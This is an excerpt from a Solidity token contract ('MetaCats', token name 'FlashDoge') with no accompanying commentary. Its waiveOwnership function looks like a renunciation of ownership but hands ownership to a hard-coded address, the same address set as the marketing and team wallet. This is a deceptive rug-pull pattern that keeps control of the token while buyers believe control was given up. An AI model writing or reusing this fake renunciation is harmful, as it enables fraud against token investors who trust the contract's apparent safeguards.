...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x09adc26b53F512A056E98991385166Eeb8CD8EcC));
        _owner = address(0x09adc26b53F512A056E98991385166Eeb8CD8EcC);
    }
...
contract MetaCats is Context, IERC20, Ownable {
    ...
    string private _name = "FlashDoge";
    ...
    address payable public marketingWalletAddress = payable(0x09adc26b53F512A056E98991385166Eeb8CD8EcC); // Marketing Address
    address payable public teamWalletAddress = payable(0x09adc26b53F512A056E98991385166Eeb8CD8EcC); // Team Address
